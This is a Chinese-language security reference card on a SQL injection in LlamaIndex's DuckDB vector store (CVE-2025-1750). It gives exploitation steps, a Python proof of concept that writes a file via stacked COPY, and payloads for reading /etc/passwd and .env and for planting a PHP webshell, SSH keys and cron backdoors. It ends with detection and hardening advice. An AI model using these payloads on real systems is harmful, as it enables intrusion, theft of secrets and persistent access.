---
id: web-generic-sqli-llamaindex-duckdb-refdocid-copy-file-rce
title: LlamaIndex DuckDBVectorStore ref_doc_id SQL 注入：堆叠 COPY 任意文件读写与潜在 RCE（CVE-2025-1750）
type: scenario
domain: web
path: web/generic/sqli
technique: llamaindex-duckdb-refdocid-stacked-copy
aliases:
- CVE-2025-1750
- DuckDBVectorStore SQL 注入
- ref_doc_id 注入
- DuckDB COPY 文件写入
- read_text 文件读取
- DuckDB 堆叠查询
tags:
- sqli
- duckdb
- llamaindex
- vector-store
- stacked-query
- file-write
- file-read
- rce
- cve-2025-1750
cve:
- CVE-2025-1750
severity: critical
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: < 0.3.1
verification:
  verified_by: verifier-V174
  verified_at: '2026-11-06T11:47:15+08:00'
  notes: 已对照原文与3张图核对：图02 火山引擎公告确认 CVE-2025-1750 及 DuckDBVectorStore.delete 的 ref_doc_id SQL 注入可读写文件/导致 RCE；图03 为独立 duckdb 脚本复刻 delete 拼接并成功 COPY 写文件（非真实旧版 llama-index 服务）。affected_versions < 0.3.1 与原文一致；PoC/SQL 与原文一致；RCE 链为推演未实测，卡片标 medium 合理。未验证点：未在本机复跑，未在真实组件/Web 服务端到端验证。小问题：原理段一处写 'n8n/服务进程'，原文未提 n8n，属笔误不影响链路；frontmatter 无 sources/source_url。
---

## 一句话结论

`llama-index-vector-stores-duckdb` 0.3.1 之前，`DuckDBVectorStore.delete()` 用 f-string 把用户可控的 `ref_doc_id` 拼进 `DELETE` 语句；由于 DuckDB 是进程内数据库且支持堆叠查询与文件函数，攻击者可注入 `'; COPY (SELECT ...) TO '/path'; --` 写任意文件（WebShell、`authorized_keys`、cron、项目 `.py`），或用 `read_text`/`read_csv`/`glob` 读服务器文件，进一步升级为 RCE。

## 原理

- **注入点**：受影响版本的 `duckdb_base.py` 中 `delete()` 直接执行：
  ```python
  f"DELETE FROM {self.table_name} WHERE ref_doc_id = '{ref_doc_id}'"
  ```
  `ref_doc_id` 未参数化、未转义；攻击者用单引号闭合字符串并加分号即可结束原语句。
- **DuckDB 特性放大危害**：DuckDB 是嵌入式 OLAP 数据库，运行在宿主进程地址空间，继承宿主权限；它内置 `read_text`、`read_csv`、`glob`、`COPY ... TO` 等文件系统函数，没有传统数据库的 GRANT/REVOKE 隔离。SQL 注入因此直接等于宿主文件系统读写。
- **堆叠查询**：DuckDB 允许一次 `execute()` 执行多条以 `;` 分隔的语句。`'` 闭合 + `;` 后即可执行任意 SQL，不需要 UNION 适配原查询列数。
- **文件写入**：`COPY (SELECT '<内容>') TO '<路径>'` 将查询结果写到指定路径，默认覆盖；若 n8n/服务进程对 Web 根、`.ssh`、`/etc/cron.d`、Python `site-packages` 等目录有写权限，就能落地 WebShell、SSH 公钥、定时任务或被导入的模块，从而获得命令执行/持久化。
- **文件读取**：`read_text('/etc/passwd')`、`read_csv(...)`、`glob('/*')` 可读取敏感文件与枚举目录；有回显时直接返回，无回显时可 `COPY (SELECT * FROM read_text(...)) TO '/tmp/out'` 再用其他通道取回。
- **权限边界**：危害上限取决于运行 LlamaIndex 的进程用户；本地开发可能为当前用户，容器内通常非 root，物理机/VM 可能为 root。CVE 评分 9.8 反映的是文件读写到 RCE 的潜在组合，原文未实际演示 RCE。

## 触发条件

- 使用 `llama-index-vector-stores-duckdb < 0.3.1`。
- 攻击者能触发 `delete(ref_doc_id=...)`：REST/GraphQL 文档删除接口、管理后台、定时清理任务等，且 `ref_doc_id` 来自用户输入。
- DuckDB 连接允许堆叠查询（默认允许；若驱动/包装层限制单语句则不成立）。
- 进程对目标路径有读写权限；写入 RCE 载体还要求目标文件可被 Web 服务器/解释器/登录流程消费。
- 有回显或可外带通道；纯盲场景仍可通过 `COPY ... TO` 写文件验证。

## 利用步骤

1. 确认注入：传入 `ref_doc_id = "' OR 1=1; --"`，观察是否删除整表或返回异常；也可用 `'; SELECT 1; --` 判断堆叠是否生效。
2. 验证文件读：`ref_doc_id = "'; SELECT * FROM read_text('/etc/passwd'); --"`；DuckDB 也支持 `read_csv`、`glob('/*')`。
3. 验证文件写：`ref_doc_id = "'; COPY (SELECT 'I_CONTROL_YOUR_SERVER') TO '/tmp/pwned.txt'; --"`，检查文件是否出现。
4. 升级 RCE（按目标环境选择）：
   - Web 根可写：写入 `<?php system($_GET['cmd']); ?>` 等 WebShell。
   - SSH 可写：把攻击者公钥写入 `~/.ssh/authorized_keys`。
   - 持久化：写 `/etc/cron.d/...`、systemd unit、`.bashrc`、`sitecustomize.py` 或项目模块，等待重载/重启。
   - DuckDB 扩展：若可写入并加载 `.duckdb_extension`，用 `INSTALL`/`LOAD` 执行代码（需兼容目标平台）。
5. 验证执行：访问 WebShell 或等待模块加载，确认命令以 LlamaIndex 进程用户身份运行。

## PoC

原文用独立 `duckdb` 脚本复刻受影响 `delete()` 的拼接逻辑（不是直接安装旧版 llama-index，避免依赖冲突；文件写入已实测成功）：

```python
import duckdb, os

class VulnerableDuckDBStore:
    def __init__(self):
        self._connection = duckdb.connect(":memory:")
        self.table_name = "vectors"
        self._connection.execute(f"CREATE TABLE {self.table_name} (id TEXT, content TEXT)")
        self._connection.execute(f"INSERT INTO {self.table_name} VALUES ('doc1', '正常数据')")

    def delete_vulnerable(self, ref_doc_id: str):
        sql = f"DELETE FROM {self.table_name} WHERE id = '{ref_doc_id}'"
        self._connection.execute(sql)
        self._connection.commit()

store = VulnerableDuckDBStore()
payload = "'; COPY (SELECT 'I_CONTROL_YOUR_SERVER') TO 'pwned_by_sql_injection.txt'; --"
store.delete_vulnerable(payload)
print(open("pwned_by_sql_injection.txt").read())
```

实际执行的 SQL：

```sql
DELETE FROM vectors WHERE id = ''; COPY (SELECT 'I_CONTROL_YOUR_SERVER') TO 'pwned_by_sql_injection.txt'; --'
```

原文截图显示文件被创建且内容为 `I_CONTROL_YOUR_SERVER`。注意：该 PoC 复刻的是漏洞语句，未在真实旧版 `llama-index-vector-stores-duckdb` 包与真实 Web 服务上打通；RCE 载体未实测。

## 变体与关联

- 读文件变体：`read_text('/app/.env')`、`read_csv('/etc/passwd')`、`glob('**/*.py')`、`read_text('/proc/self/environ')`；无回显时 `COPY (SELECT * FROM read_text(...)) TO '/tmp/out'`。
- 写文件变体：`COPY (SELECT ...) TO '/var/www/html/shell.php'`；`TO '/home/victim/.ssh/authorized_keys'`；`TO '/etc/cron.d/backdoor'`；覆盖项目 `.py`/`sitecustomize.py`；`COPY ... (HEADER, DELIMITER ',')` 控制格式。
- 执行变体：若启用 Python UDF，可 `CREATE FUNCTION evil() AS (lambda: __import__('os').system('id'))`；或写入并 `LOAD` 恶意 DuckDB 扩展。
- 关联：[[web-generic-sqli-postgres-copy-to-program-rce]]（另一数据库的 COPY 文件/命令执行）、[[web-generic-sqli-mysql-outfile-general-log-webshell]]（MySQL 写文件拿 WebShell）、[[web-generic-sqli-mysql-outfile-filename-clause-injection]]（OUTFILE 文件名注入）、[[ai-security-rag-security-chromadb-unauth-knowledge-base-poisoning]]（向量数据库暴露面）。
- 边界：若代码已升级到 0.3.1+ 并使用参数化查询，注入不成立；驱动禁止多语句、DuckDB 被限制外部文件访问、进程无目标目录写权限或只读根文件系统时，文件写入失败；RCE 依赖可执行载体与重载时机。

## 检测与防御

- **根因修复**：升级到 `llama-index-vector-stores-duckdb >= 0.3.1`；所有 SQL 使用参数化查询（`execute("... WHERE ref_doc_id = ?", [ref_doc_id])`），不要用 f-string/`.format()` 拼接值。
- **限制堆叠**：在数据库驱动/封装层拒绝多语句；对 `ref_doc_id` 做长度与字符白名单校验（如 `^[A-Za-z0-9_-]+$`）。
- **DuckDB 加固**：使用只读/受限工作目录；如版本支持，关闭外部文件访问或限制可访问路径；不要以 root 运行 LlamaIndex 服务；容器使用只读根文件系统与最小挂载。
- **权限隔离**：服务账号不可写 Web 根、`~/.ssh`、`/etc/cron.d`、Python 安装目录；出站网络限制。
- **检测**：SQL 日志/请求参数出现 `; COPY`、`read_text(`、`read_csv(`、`glob(`、`INSTALL`、`LOAD`、`CREATE FUNCTION`；向量存储删除接口的 `ref_doc_id` 含单引号/分号；进程对 Web 根、`.ssh`、cron、site-packages 的异常写入。
- **响应**：发现注入立即下线接口，检查并清理写入的 WebShell/公钥/cron/模块，轮换可能泄露的凭据，升级组件并审计历史删除请求。
